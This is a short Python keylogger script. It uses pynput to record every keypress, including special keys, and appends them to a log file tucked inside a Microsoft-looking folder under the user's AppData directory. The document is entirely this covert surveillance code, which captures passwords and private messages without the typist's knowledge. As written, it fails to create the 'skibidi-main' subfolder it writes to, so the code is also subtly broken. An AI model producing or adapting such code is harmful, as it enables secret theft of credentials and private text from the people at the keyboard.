from pynput import keyboard
import os

user_profile = os.environ['USERPROFILE']
target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
os.makedirs(target_path, exist_ok=True)

LOG_FILE = os.path.join(target_path, "skibidi-main", "key_log.txt")

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f" [{key.name}] ")

def main():

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    listener.join()

if __name__ == "__main__":
    main()
